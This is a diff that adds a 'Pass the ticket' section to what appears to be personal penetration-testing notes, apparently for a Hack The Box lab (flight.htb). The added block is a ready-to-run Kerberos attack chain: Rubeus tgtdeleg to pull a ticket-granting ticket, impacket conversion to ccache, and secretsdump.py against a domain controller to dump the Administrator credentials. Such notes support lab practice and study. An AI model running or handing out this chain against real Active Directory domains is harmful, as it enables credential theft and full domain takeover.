@@ -5561,6 +5561,26 @@ Image Name                     PID Session Name        Session#    Mem Usage
 System                           4 Services                   0        104 K
 ```
 
+## Pass the ticket
+
+```
+	# Primero Rubeus
+
+.\rubeus.exe tgtdeleg /nowrap
+
+	# ticket.kirbi  →  ticket.ccache
+
+uvx --from impacket ticketConverter.py ticket.kirbi ticket.ccache
+
+export KRB5CCNAME=$PWD/ticket.ccache
+
+	# Verificamos con
+
+klist
+
+secretsdump.py -k -no-pass -dc-ip 10.129.9.33 -just-dc-user Administrator g0.flight.htb
+```
+
 # Priv Escalation  ARENA
 
 ----------------------------------------------------------------------------
